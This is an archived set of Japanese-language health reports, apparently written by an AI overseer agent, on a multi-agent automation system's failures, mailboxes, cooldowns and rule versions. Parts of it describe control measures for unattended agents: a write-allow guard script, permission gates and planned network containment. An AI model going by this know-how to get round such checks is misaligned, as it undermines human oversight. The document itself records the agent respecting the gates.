+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（今週分＝月曜 1:00 cron。前回＝Cycle 059・08-03。月次全体最適棚卸しは 07-28 実施＝30日未満のため今回対象外＝次回 08-27 頃・O-034 の rally/konjaku 定点アナウンスも同回）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着なし・輪番101件スキップ・追跡期限切れ1件 untrack）／mailbox <span class="font-mono">new/</span> 29通の宛先を全件実測（<span class="font-mono">to: overseer</span> <strong>0通</strong>）・<span class="font-mono">hold/</span> 0通／<span class="font-mono">python3 bin/system-health.py</span> 実行＋7日トレンド（比較元 08-03 01:15）／<span class="font-mono">failures.jsonl</span> 全読／<span class="font-mono">last-tick.txt</span>／ルール6本の version 実測（hp-loop 0.18・blog-loop 0.3・partner 1.0・comms 0.7.3・finance 0.2・overseer 1.0）／SYSTEM.md／overseer.md の未コミット差分（git diff 実読）／<span class="font-mono">agent-tick.sh</span> の失敗分類（実読）／便 <span class="font-mono">M-20260805T170425</span> の原文と ycom coverage.md L138（実読）／git log・status。<strong>未実測（正直に）</strong>＝回帰テスト <span class="font-mono">bin/test-*.py</span>（実行を試行→許可ゲートで拒否＝🔵お願い継続）。</p>
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は OOM 対策後の最良を更新</strong>＝<span class="font-mono">failures.jsonl</span> の最終エントリは 08-04 01:12（<span class="font-mono">overseer-nocredit</span>）＝<strong>以降6日間 故障の記録ゼロ</strong>（timeout は 07-31 を最後に9日連続ゼロ・oom-kill 累計16回で+0・空きメモリ 3.2GB・swap 使用14%）。partner も社長便を正常消化＝O-037 の応急解消を実測。最大の綻びは<strong>器・台帳の肥大系に集中</strong>＝skill-kaizen 225KB（O-035🔴）・fujisaka 掲示板 97KB＞80KB 不発（🆕O-038）・処理済み便の滞留偽陽性（O-036🟡）。新規起票1・格上げ2・降格1（O-037）・前提更新3（O-029・O-016・O-009）。</p>
+    </div>
+    <div class="border border-gray-200 rounded-lg p-4 mb-4">
+      <h4 class="font-bold mb-2 text-sm">🩺 精密診断の実測（Step 1 全項目）</h4>
+      <ul class="text-xs text-gray-700 space-y-1 list-disc pl-5">
+        <li><strong>固定費（system-health 実測）</strong>：起動時自動ロード 2ファイル/10KB ✅。⚠️＝<span class="font-mono">skill-kaizen.md</span> <strong>225KB</strong>＞100KB（→O-035🔴）／fujisaka 掲示板 <strong>97KB</strong>＞80KB（→🆕O-038）／ycom coverage 101KB＞100KB（<strong>ただし 08-09 02:25 にローテ稼働を実測＝規律は生きている・ウォッチ</strong>）／増速3件＝yokohawaii coverage +42KB/7日・fujisaka +34KB/7日・yoshida +31KB/7日（→O-038 に併記）。ほか主要な器は閾値内（統括 index 75KB・partner 台帳 67KB／掲示板 68KB）。</li>
+        <li><strong>故障（7日分）</strong>：timeout 0・異常終了 5＝<strong>全件既報</strong>（08-03 <span class="font-mono">partner-noprogress</span>×4＝O-037・08-04 <span class="font-mono">overseer-nocredit</span>×1）。<strong>08-05 以降の新規ゼロ</strong>。nocredit の名指し検知（<span class="font-mono">6194753</span>）が正しく分類した実例を確認。恒久策（実行時間ベースの起動失敗判定）は <span class="font-mono">agent-tick.sh</span> に未実装を実読確認（→O-037 更新）。</li>
+        <li><strong>床と待ちの推移（数字のみ・判定なし）</strong>：<strong>データなし</strong>＝計画されたデータ源 <span class="font-mono">data/overseer/runtime.jsonl</span> が未新設（overseer.md v1.0 が予定した開発依頼は未実装。tick.log は 961KB＝1MB 切り詰め前）。ゼロで埋めず「データなし」と正直に記録します。</li>
+        <li><strong>版ズレ・地図ドリフト</strong>：SYSTEM.md は有人セッションで版表5行が同期済み（<strong>未コミット</strong>）。残存＝<strong>partner 行の欠落（partner.md は v1.0）・comms 0.3 表記 vs 実体 v0.7.3（08-07 に v0.7.2 rooms.md／v0.7.3 Codex 反映と2版進行）・finance 0.1 表記 vs 実体 0.2・rally/konjaku 未掲載</strong>（→O-016 差分更新）。overseer.md v1.0（08-06・床と待ち節追加）も未コミット。</li>
+        <li><strong>受信盲点の実害（O-036 の新事実）</strong>：<span class="font-mono">M-20260805T170425</span>（web-hanasaka→hp-loop-ycom・実装報告）＝中身は 08-06 ycom サイクルで処理済み（coverage L138「独立検証済・先方報告と完全一致」）なのに <span class="font-mono">done</span> 空振りで <span class="font-mono">new/</span> に残留＝滞留⚠️と <span class="font-mono">defer(1)</span> の偽陽性。便中の社長宛質問3点の到達は未確認＝🔔の O-036 に記載。</li>
+        <li><strong>滞り（mailbox）</strong>：<span class="font-mono">new/</span> 29通＝拠点PC宛28＋偽陽性1（内訳は※連絡）。<span class="font-mono">hold/</span> 0通。bare <span class="font-mono">to: hp-loop</span> の新規孤児なし（O-014 安定継続）。web-hanasaka は 08-05 に拠点稼働・往復実績あり（11→7通）。</li>
+        <li><strong>器の規律（自分の分）</strong>：追記前に <strong>Cycle 057 をアーカイブへ収容</strong>（Cycle 060 予告の収容候補どおり・移設先での実在を grep で確認・バイト検算は下記）。追記後も 80KB トリップワイヤ内を確認。<strong>次回収容候補＝Cycle 058</strong>。</li>
+        <li><strong>自己改善（K-507）</strong>：「処理済みなのに new/ に残る」偽陽性は滞留監視の信頼を直接毀損する＝滞留⚠️を報じる前に <span class="font-mono">cur/</span>・coverage 等で「本当に未処理か」を1段裏取りする（今回 system-health の⚠️をそのまま転記せず実読で偽陽性と判定できた）＝skill-kaizen に1〜3行で記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ===== Cycle 060（2026-08-12 Cycle 062 で index から収容・当サイクル追記で index 87KB＝80KB tripwire 超過のため／本文改変なし） ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 060 — 2026-08-04 未明（軽い巡回・火曜 1:00 fallback cron・<strong>🆕🔴O-037＝社長の昨夜の返信が冷却で眠っている（起動失敗を「サボり」と誤判定）</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：<strong>軽い巡回</strong>（火曜 1:00 の fallback 便。判定＝overseer.md v0.9 の「今週＝月曜起算に精密診断が既に1回でもあるか」を掲示板から実読 → <strong>Cycle 059・08-03 月曜＝今週実施済み</strong>のため肩代わりせず軽く終える。＝v0.9 で塞いだ「火曜の二重フル診断」の穴が設計どおり働いた初回）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着なし・輪番走査で古いスレッド101件スキップ・警告なし）／<span class="font-mono">data/mailbox/new/</span> 25通の宛先を全件実測（<span class="font-mono">to: overseer</span> <strong>0通</strong>）・<span class="font-mono">hold/</span> 0通／<span class="font-mono">last-tick.txt</span>／<span class="font-mono">failures.jsonl</span>／<span class="font-mono">data/overseer/</span> の状態ファイル一覧／<span class="font-mono">tick.log</span> の 08-03 partner 全経路（実読）／<span class="font-mono">rules/modes/partner.md</span> L151 受信手順／<span class="font-mono">git log</span>。<strong>未実測（正直に）</strong>＝<span class="font-mono">system-health.py</span>（精密診断でないため未実行・毎日 01:15 の cron 便が別途蓄積）・回帰テスト <span class="font-mono">bin/test-*.py</span>（許可未追加＝🔵お願い継続）。</p>
+    <div class="border-l-4 border-red-400 bg-red-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤の数値は良好</strong>（<span class="font-mono">status=ok</span>・timeout/oom-kill とも 08-01 以降ゼロを維持＝4日連続）。しかし<strong>軽い巡回の冒頭チェック（K-421 で定点化した last-tick 1行）が本物の綻びを1件釣り上げました</strong>＝<span class="font-mono">partner:1:cooldown(142分)</span>。追跡した結果、<strong>社長が昨夜 19:59 に #partner へ書かれた返信が、起動失敗を「便のサボり」と誤判定した冷却によって最短8時間眠る</strong>状態でした＝<strong>🆕🔴O-037</strong>（上の🔔ボックス）。新規起票はこの1件のみ・既存カードの再掲なし。</p>
+    </div>
+    <div class="border border-gray-200 rounded-lg p-4 mb-4">
+      <h4 class="font-bold mb-2 text-sm">🩺 実測ログ（軽い巡回の範囲）</h4>
+      <ul class="text-xs text-gray-700 space-y-1 list-disc pl-5">
+        <li><strong>Step 0</strong>：Slack <span class="font-mono">fetch</span>＝新着なし。自分宛（<span class="font-mono">to: overseer</span>）<strong>0通</strong>＝社長からの新しいご指示・ご回答はありません（したがって本サイクルはスレッド返信なし）。</li>
+        <li><strong>O-037 の追跡経路（すべて実読）</strong>：<span class="font-mono">last-tick.txt</span> の <span class="font-mono">partner:1:cooldown(142分)</span> → <span class="font-mono">failures.jsonl</span> に 08-03 の <span class="font-mono">partner-noprogress</span> ×4（10:36・11:07・20:25・21:21） → <span class="font-mono">tick.log</span> 915-919行／1050-1053行に <span class="font-mono">You're out of usage credits.</span>、2735行／2875行に <span class="font-mono">Execution error</span> → いずれも起動から4〜13秒で終了 → <span class="font-mono">data/mailbox/new/</span> に <span class="font-mono">to: partner</span> 1通が残存。<strong>「partner が inbox を空振りしている（O-036 型）」説は棄却しました</strong>＝<span class="font-mono">cur/</span> の <span class="font-mono">to: partner</span> は 08-03 だけで 10:36／10:37／12:43／14:57／15:39／16:05 に消化済み＝<strong>受信自体は健全</strong>。原因は起動失敗の誤分類に絞り込めます。</li>
+        <li><strong>故障（Cycle 059 以降の差分）</strong>：timeout・oom-kill とも<strong>追加ゼロ</strong>（最後の timeout は 07-31 13:10、oom-kill は 07-31 12:59）＝OOM 対策（<span class="font-mono">choom</span>・swap 8GB・冷却）以降<strong>4日連続で故障ゼロ</strong>を維持＝O-029 の緊急度低下は継続。新規は上記 <span class="font-mono">partner-noprogress</span> ×4 のみ。</li>
+        <li><strong>滞り（mailbox）</strong>：<span class="font-mono">new/</span> <strong>25通</strong>（22→25）＝内訳 <span class="font-mono">web-hanasaka</span> 11／<span class="font-mono">yoshida-dev</span> 7／<span class="font-mono">fujisaka-dev</span> 4／<span class="font-mono">yokohawaii-dev</span> 2／<strong><span class="font-mono">partner</span> 1（＝O-037）</strong>。<span class="font-mono">hold/</span> 0通。bare <span class="font-mono">to: hp-loop</span> の新規孤児なし（O-014 安定継続）。</li>
+        <li><strong>器の規律（自分の分）</strong>：追記前に <strong>Cycle 056 を本アーカイブへ収容</strong>（Cycle 059 が予告した収容候補どおり）＝index 78.2KB → <strong>64.0KB</strong>・archive 224.6KB → <strong>239.2KB</strong>。<strong>バイト検算</strong>＝index −14,240B・archive +14,589B（差はマーカーコメント分・移送本文は改変なし・移設先での実在を <span class="font-mono">grep</span> で確認）。当サイクル追記後も 80KB トリップワイヤ内。<strong>次回収容候補＝Cycle 057</strong>。</li>
+        <li><strong>自己改善（K-423）</strong>：「冷却の残り分数」は<strong>止まっている時間の長さそのもの</strong>＝軽い巡回では <span class="font-mono">cooldown(N分)</span> を見つけたら必ず「誰の・何が・いつから待たされているか」まで1段掘る（今回はここから社長の便の放置を発見）＝<span class="font-mono">skill-kaizen.md</span> に1〜3行で記録（K-422 の書式規律を自分から守る）。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ===== Cycle 059（2026-08-12 Cycle 062 で index から収容・index 78KB＝80KB tripwire の 97% に達したため／本文改変なし） ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 059 — 2026-08-03 未明（<strong>精密診断</strong>・月曜 1:00 cron・<strong>🆕O-035（skill-kaizen 再肥大）／🆕O-036（受信手順の版ズレ）＋OOM 対策後3日間の故障ゼロを確認</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：精密診断（今週分。前回＝Cycle 050・07-28＝先週。月次全体最適棚卸しは 07-28 実施＝30日未満のため今回対象外＝次回8月末ごろ・O-034 の rally／konjaku 定点アナウンスも同回）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着なし・輪番103件スキップ・警告なし）／mailbox <span class="font-mono">new/</span> 22通の宛先を全件実測（<span class="font-mono">to: overseer</span> <strong>0通</strong>）・<span class="font-mono">hold/</span> 0通／<span class="font-mono">python3 bin/system-health.py</span> 実行＋7日トレンド（比較元 07-27 スナップショット）／<span class="font-mono">failures.jsonl</span> 全読＋サイト別分布（K-420 の定点）／<span class="font-mono">last-tick.txt</span>／ルール6本の version 実測（hp-loop・blog-loop・partner・comms・finance・ledger-discipline）／<span class="font-mono">hp-loop.md</span> L176・<span class="font-mono">blog-loop.md</span> L133・<span class="font-mono">settings.local.json</span>・<span class="font-mono">skill-kaizen.md</span> 実読。<strong>未実測（正直に）</strong>＝git 状況（<span class="font-mono">status</span>／<span class="font-mono">log</span> とも本セッションの許可外＝O-009 は冒頭スナップショット値）・回帰テスト <span class="font-mono">bin/test-*.py</span>（許可未追加＝🔵お願い再掲）。</p>
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は精密診断として最良の部類＝07-31 の OOM 対策（choom・swap 8GB・冷却 <span class="font-mono">d4cc5f2</span>）以降、08-01〜08-03 の3日間 故障ゼロ</strong>（timeout・oom-kill・noprogress とも追加なし／冷却の誤発火なし／swap 8GB 稼働・空きメモリ 4.2GB／OOM kill 累計16回で+0）。最大の綻びは<strong>skill-kaizen 台帳の再肥大（57.7→128.6KB・5日・+14KB/日）＝🆕O-035</strong>。ほか<strong>🆕O-036</strong>（ルール本文の受信手順が空振り＝4ループ実測済み・実害なし・次改修同乗）。新規はこの2件・既存カードの前提更新5件（O-029・O-021・O-016・O-009・※連絡）・✅クローズ1件（O-018 発火確認完了）。</p>
+    </div>
+    <div class="border border-gray-200 rounded-lg p-4 mb-4">
+      <h4 class="font-bold mb-2 text-sm">🩺 精密診断の実測（Step 1 全項目）</h4>
+      <ul class="text-xs text-gray-700 space-y-1 list-disc pl-5">
+        <li><strong>固定費（system-health 実測）</strong>：起動時自動ロード 2ファイル/10KB ✅。⚠️は <span class="font-mono">skill-kaizen.md</span> 128KB＞100KB（→O-035）と増速2件（統括 index +37KB/7日・yokohawaii coverage +31KB/7日＝いずれも閾値内・ウォッチ）。ycom coverage 97KB／ycom 掲示板 75KB／partner 台帳 68KB・掲示板 60KB＝<strong>主要な器はすべて閾値内</strong>。</li>
+        <li><strong>故障（7日分）</strong>：timeout 6・異常終了 13 は<strong>全件が既報の窓</strong>（07-27 課金障害の fail(1)×12＝✅O-022／timeout は O-029 系）。<strong>08-01 以降の新規ゼロ</strong>。冷却の発火は 07-31 16:42 の1回のみ（Cycle 058 で処理済み）＝誤発火なし。</li>
+        <li><strong>✅O-018 発火確認完了</strong>：partner 掲示板 index <strong>93.1→60KB</strong>・archive 376KB（08-02 更新）＝v0.7 トリップワイヤ成立後にローテが実際に回ったことを実測＝O-018 は発火確認まで含め完全クローズ。</li>
+        <li><strong>版ズレ・地図ドリフト</strong>：<strong>comms v0.5（07-30 社長承認）＝Gmail 第2入力・💬/📧 マーク・<span class="font-mono">mail-strip.py</span> 新設が SYSTEM.md v0.3 未反映</strong>（→O-016 差分に追加）。あわせて <strong>O-032／O-030 の前提更新</strong>＝comms が無人で読む外部入力は Chatwork＋Gmail の2系統に拡大（案C ネットワーク遮断の対象と、台帳の増速要因が広がった＝同乗方針は不変・単独着手不要のまま）。</li>
+        <li><strong>滞り（mailbox）</strong>：<span class="font-mono">new/</span> 22通＝全件が拠点PC宛（web-hanasaka 10／yoshida-dev 6／fujisaka-dev 4／yokohawaii-dev 2）＝上の※連絡に更新。<span class="font-mono">hold/</span> 0通。bare <span class="font-mono">to: hp-loop</span> の新規孤児なし（O-014 安定継続）。</li>
+        <li><strong>未完の型・持ち越しの実査</strong>：Cycle 058 持ち越し「yoshida／fujisaka も受信盲点で回っていないか」＝<strong>K-355 で当該ループ自身が同日実測済み（スプール直読で自衛中）を確認＝実査完了</strong>。残るのはルール本文の差し替えだけ→O-036 に起票。</li>
+        <li><strong>器の規律（自分の分）</strong>：追記前に🔔ボックスの✅解決3行＋旧断片（計約4.8KB）を<a href="index.html" class="text-blue-600 hover:underline">最新レポート</a>から本アーカイブへ収容（移設先の実在を grep で確認・本文原文のまま）。追記後の実測は下記報告のとおり。<strong>次回収容候補＝Cycle 056</strong>（index は現在4サイクル分を保持＝規約の「最新＋直近文脈」よりやや厚い）。</li>
+        <li><strong>自己改善（K-422）</strong>：台帳肥大を指摘する自分の K 追記も同じ台帳を太らせる＝K 記録は1〜3行を自分が先に守る（本サイクルから実践）＝skill-kaizen に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ===== Cycle 058（2026-08-12 Cycle 062 で index から収容・index 78KB＝80KB tripwire の 97% に達したため／本文改変なし） ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 058 — 2026-07-31 夜（軽い巡回・反応tick <span class="font-mono">/overseer</span>・<strong>hanasaka-main 便の起票依頼2件を処理＝🆕🔴O-033（cgroup メモリ上限）／🆕📌O-034（rally・konjaku 月次アナウンス定点化）</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：軽い巡回（最新の精密診断＝Cycle 050・2026-07-28＝<strong>今週（07-27週）実施済み</strong>のため切替なし。次は 08-03 月曜 1:00 cron）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着なし・輪番走査で古いスレッド93件スキップ・<span class="font-mono">thread_not_found</span> 警告1件＝致命でない）／<span class="font-mono">data/mailbox/new/</span>（<span class="font-mono">to: overseer</span> <strong>1通</strong>＝<span class="font-mono">M-20260731T163206-hanasaka-main</span>）／<span class="font-mono">failures.jsonl</span>／<span class="font-mono">last-tick.txt</span>／<span class="font-mono">bin/agent-tick.sh</span> L50-52・L585-587（実読）／<span class="font-mono">bin/test-cooldown.sh</span>・<span class="font-mono">test-urgent-filter.sh</span>・<span class="font-mono">test-oom-guard.sh</span>（実在確認）／<span class="font-mono">hold/</span>。</p>
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は正常</strong>（17:12 <span class="font-mono">status=ok</span>・<span class="font-mono">hold/</span> 0通・全エージェント idle。<span class="font-mono">overseer</span> のみ <span class="font-mono">cooldown</span> 表示＝下記のとおり本サイクルで解消）。本サイクルの主題は<strong>社長承認済みの起票依頼2件の反映</strong>（O-033・O-034＝上の🔔ボックス参照）。新規起票はこの2件のみ。</p>
+    </div>
+    <div class="border border-gray-200 rounded-lg p-4 mb-4">
+      <h4 class="font-bold mb-2 text-sm">📋 処理ログ（受信箱1通→起票2件）＋基盤の実測</h4>
+      <ul class="text-xs text-gray-700 space-y-1 list-disc pl-5">
+        <li><strong>受信箱</strong>：<span class="font-mono">M-20260731T163206</span>（hanasaka-main→overseer・社長承認済みの起票依頼）を処理→<strong>O-033・O-034 を起票</strong>し便を <span class="font-mono">cur/</span> へ。依頼文の言い値をそのまま載せず、<strong>choom が上限でないこと（L50-52）・rally/konjaku 除外と注記の実在（L585-587）・OOM 4イベントの時刻（<span class="font-mono">failures.jsonl</span>）・回帰テスト3本の実在を統括側で裏取り</strong>してから起票しました。この便は Slack 発でないため（<span class="font-mono">slack.thread_ts</span> なし）スレッド返信は無し＝社長への報告は日報 post で行います。</li>
+        <li><strong>新設の冷却機構が初日から設計どおり作動（経過観察の初回報告）</strong>：16:42 に <span class="font-mono">overseer-noprogress</span> が記録され、17:12 の tick で <span class="font-mono">overseer:1:cooldown</span> を実測。＝本便（16:32 着）を引き金に起動した反応tickが<strong>便を処理せず終了→「起動の引き金が未処理のまま」を検知して冷却</strong>という <span class="font-mono">d4cc5f2</span> の想定動作そのものです（<strong>推測</strong>：16:41 まで有人 Cycle 057 セッションが走っており競合した可能性）。暴走再起動にならず冷却→本サイクルで処理完了＝<strong>実害なし・機構の有効性の傍証1例目</strong>。Cycle 057 予告どおり 08-03 精密診断で発火・誤発火をまとめて実測します。</li>
+        <li><strong>故障の記録（Cycle 057 以降の差分）</strong>：新規は 07-30 05:25 <span class="font-mono">blog-loop:ycom-timeout</span>（O-029 系・累計8件＝ycom 7・fujisaka 1。K-420 の分布1行チェック実施）と上記 <span class="font-mono">overseer-noprogress</span> のみ。<span class="font-mono">oom-kill</span> の追加発生なし（12:59 が最後）。</li>
+        <li><strong>持ち越し（08-03 精密診断の点検候補）</strong>：hp-loop-yokohawaii が K-419 で「<span class="font-mono">mailbox.sh inbox</span>／<span class="font-mono">done</span> は .env トークン名義（hp-loop）の箱しか見えず、<span class="font-mono">hp-loop-&lt;site&gt;</span> 宛の新着が API では0件に見える」構造を報告（スプール直読で回避済み・§10 記載済みと自己申告）。<strong>yoshida／fujisaka ループも同じ盲点で回っていないか</strong>を精密診断で実査します（本サイクルでは未確認）。</li>
+        <li><strong>器の規律（自分の分）</strong>：追記前にページ冒頭「最終更新」欄を当サイクル分に圧縮（Cycle 056 確立の運用どおり・旧要約の全文はサイクルログに残存）。追記後の index 実測は下記報告のとおり閾値内。</li>
+        <li><strong>自己改善（K-421）</strong>：反応tickの <span class="font-mono">noprogress</span>＋<span class="font-mono">cooldown</span> 表示は「自分宛の便が処理されずに残っている」ことを教える<strong>新しい計器</strong>＝軽い巡回の冒頭チェック（last-tick 1行）で自分のラベルの状態も必ず見る（今回は偶然拾えたが定点にする）＝skill-kaizen に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ===== Cycle 057（2026-08-10 Cycle 061 で index から収容・index 75KB＋当サイクル追記で 80KB tripwire 超過見込みのため／本文改変なし） ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 057 — 2026-07-31 夕（軽い巡回・有人 <span class="font-mono">/overseer</span>・<strong>本日の OOM 事案＋同日対策を記録・O-029 の前提更新</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：軽い巡回（最新の精密診断＝Cycle 050・2026-07-28＝<strong>今週（07-27週）実施済み</strong>のため切替なし。次は 08-03 月曜 1:00 cron）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着なし・輪番走査で古いスレッド93件スキップ・<span class="font-mono">thread_not_found</span> 警告1件＝致命でない）／<span class="font-mono">data/mailbox/new/</span>（<span class="font-mono">to: overseer</span> <strong>0通</strong>）／<span class="font-mono">failures.jsonl</span>／<span class="font-mono">last-tick.txt</span>／git log・staged／<span class="font-mono">bin/agent-tick.sh</span> の cooldown 実装（実読）／<span class="font-mono">.claude/settings.local.json</span>。</p>
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>基盤は夕方時点で正常</strong>（16:31 <span class="font-mono">status=ok</span>・全14エージェント idle・<span class="font-mono">hold/</span> 0通）。<strong>本日昼に OOM＋ycom 暴走の事案</strong>（12:44〜13:10 に timeout×2＋oom-kill×2）がありましたが、<strong>同日中に社長承認の対策3コミットが入り収束</strong>。新規起票なし＝既存 O-029 の前提更新と経過観察のみ。</p>
+    </div>
+    <div class="border border-gray-200 rounded-lg p-4 mb-4">
+      <h4 class="font-bold mb-2 text-sm">📋 本日の OOM 事案と同日対策（報告・判断不要・経過観察）</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察（実測）</strong>：<span class="font-mono">failures.jsonl</span> 07-31＝12:44 <span class="font-mono">hp-loop:ycom-timeout</span> → 12:45 <span class="font-mono">oom-kill(1)</span> → 12:59 <span class="font-mono">oom-kill(1)</span> → 13:10 <span class="font-mono">hp-loop:ycom-timeout</span>。対策コミット＝<span class="font-mono">b163f4d</span> 12:18（choom＋メモリ監視・社長承認）→ <span class="font-mono">7622bf0</span> 12:21（後始末）→ <span class="font-mono">d4cc5f2</span> 16:21（<strong>2段の歯止め＝不要な起動をしない＋失敗したら冷ます・社長承認</strong>）。cooldown 実装は <span class="font-mono">agent-tick.sh</span> L217〜 に実在を実読確認（30分→6時間・24hリセット＝<strong>★提案既定値と明記済み</strong>）。<span class="font-mono">oom-kill(1)</span> の記録自体は b163f4d の新監視が書いたもの＝<strong>新しい計器が初日から機能した傍証</strong>。<strong>次の精密診断（08-03）で cooldown の発火・誤発火を実測確認します</strong>。<strong>注</strong>：16:21 コミット後も別セッションの staged 146行（<span class="font-mono">agent-tick.sh</span> 124行ほか）が進行中＝有人作業中とみなし統括は触れていません。</p>
+    </div>
+    <div class="border border-amber-300 rounded-lg p-4 mb-4 bg-amber-50/40">
+      <h4 class="font-bold mb-2 text-sm">🟡 O-029 前提更新 — 「4件すべて ycom」が崩れました</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察（実測）</strong>：07-30 03:25 に <span class="font-mono">hp-loop:fujisaka-timeout</span>＝<strong>初の非 ycom タイムアウト</strong>。累計は7日で7件（ycom 6・fujisaka 1）。<strong>推測</strong>：07-31 の2件は OOM と同時刻帯であり、「ycom の状態量が主因」の単独説明力が低下＝<strong>メモリ圧という共通原因の可能性</strong>。<strong>ご判断3案は不変</strong>ですが、②（ycom だけ 2400秒延長）は原因がメモリなら効かない可能性＝<strong>①（工程別の実測）を推す比重が上がりました</strong>。cooldown（d4cc5f2）が timeout 連発の二次被害（暴走再起動）は止めるため、緊急度はやや下がっています。</p>
+    </div>
+    <div class="border border-gray-200 rounded-lg p-4 mb-4">
+      <h4 class="font-bold mb-2 text-sm">🔧 有人好機（今なら即反映できます）＋自己改善</h4>
+      <ul class="text-xs text-gray-700 space-y-1 list-disc pl-5">
+        <li><strong>🔵お願いの許可1行は未対応を実測</strong>＝<span class="font-mono">settings.local.json</span> に <span class="font-mono">test-*.py</span> の許可が無いことを本サイクルで確認。今なら1行で終わります。</li>
+        <li><strong>棚卸し一括（O-021・O-016・O-020 ほか）</strong>も有人の今が好機です。</li>
+        <li><strong>器の規律（自分の分）</strong>：追記後に実測 <strong>83.9KB＝80KB トリップワイヤ超過</strong>のため、<strong>Cycle 055 を当日アーカイブへ収容</strong>し <strong>67.7KB</strong> へ復帰（archive 196.2→212.7KB）。<strong>バイト検算済み</strong>＝index −16,225B・archive +16,422B（差はマーカーコメント分・移送本文は改変なし・移設先の実在を grep で確認）。</li>
+        <li><strong>自己改善（K-420）</strong>：<span class="font-mono">failures.jsonl</span> は件数だけでなく<strong>サイト別分布を毎回1行で見る</strong>（「ycom 限定」前提の崩れ＝fujisaka 拡散を2日拾い損ねた）＝skill-kaizen に記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ===== Cycle 056（2026-08-04 Cycle 060 で index から収容・index 78.2KB＋追記で 80KB tripwire 超過のため／本文改変なし） ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 056 — 2026-07-29 夜（軽い巡回・反応tick <span class="font-mono">/overseer</span>・<strong>🆕O-032 起票（無人モードの OS 側封じ込め）＋✅O-025 を実測確認してクローズ</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：軽い巡回（最新の精密診断＝Cycle 050・2026-07-28 未明＝<strong>1日前</strong>のため切替なし。次の精密診断は 08-03 月曜 1:00 cron）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着なし・輪番走査で古いスレッド89件スキップ／ratelimited なし）／<span class="font-mono">data/mailbox/new/</span>（<span class="font-mono">to: overseer</span> 1通＝<span class="font-mono">M-20260729T134533</span>）／<span class="font-mono">bin/guard-unattended-edits.py</span>・<span class="font-mono">rules/modes/finance.md</span>（両方とも実読で照合）／<span class="font-mono">data/overseer/failures.jsonl</span>／<span class="font-mono">site/overseer/last-tick.txt</span>／<span class="font-mono">data/comms/chatwork/ledger.md</span>／<span class="font-mono">data/mailbox/{new,hold}/</span>。</p>
+
+    <div class="border-l-4 border-emerald-400 bg-emerald-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>社長ご依頼1件を処理＝新規起票1件・クローズ1件・基盤は正常</strong>（<span class="font-mono">status=ok</span>／全14エージェント idle／<span class="font-mono">hold/</span> 0通／新規故障ゼロ＝<span class="font-mono">failures.jsonl</span> の最新は 07-29 05:25 <span class="font-mono">blog-loop:ycom</span> タイムアウト＝既報 O-029 で追加なし）。<strong>本サイクルの主題は「暫定対処が入った安全機構を、統括が独立に検証できるか」</strong>でした。結論＝<strong>設定の一致は実読で検証できたが、動作の検証（回帰テスト実行）は許可コマンドの外で実施できませんでした</strong>＝この非対称を隠さず未確認として記録します（下記お願い1行）。</p>
+    </div>
+
+    <div class="border border-emerald-200 rounded-lg p-4 mb-4 bg-emerald-50/40">
+      <h4 class="font-bold mb-2 text-sm">✅ O-025 — finance の機械ガード未対応：実測確認してクローズ</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>経緯</strong>：hanasaka-main から mailbox 便（<span class="font-mono">M-20260729T134533</span>・有人セッション・社長同席）で「commit <span class="font-mono">621b434</span> で機械ガードの finance 対応（O-025）を実施した」と申告。<strong>申し送りは鵜呑みにせず実体で検証</strong>しました。</p>
+      <p class="text-xs text-gray-700 mb-2"><strong>検証結果（すべて実読）</strong>：①<span class="font-mono">bin/guard-unattended-edits.py</span> に <span class="font-mono">AGENT_POLICIES</span> 表（L93〜）が新設され <span class="font-mono">"finance"</span> 行が実在。<span class="font-mono">write_allow</span> は <span class="font-mono">data/financial/ledger.md</span>（完全一致）・<span class="font-mono">data/financial/generated/</span>（配下）・<span class="font-mono">site/drafts/partner/monthly-cost-review.html</span>（完全一致）の<strong>3件</strong>で、<span class="font-mono">rules/modes/finance.md</span> L39-43「書き込み許可（この3箇所のみ）」と<strong>完全一致</strong>。②統括が O-025 で最大の残存露出として挙げた <span class="font-mono">site/business/reviews/</span>（partner 単独所有＝丸ごと Write 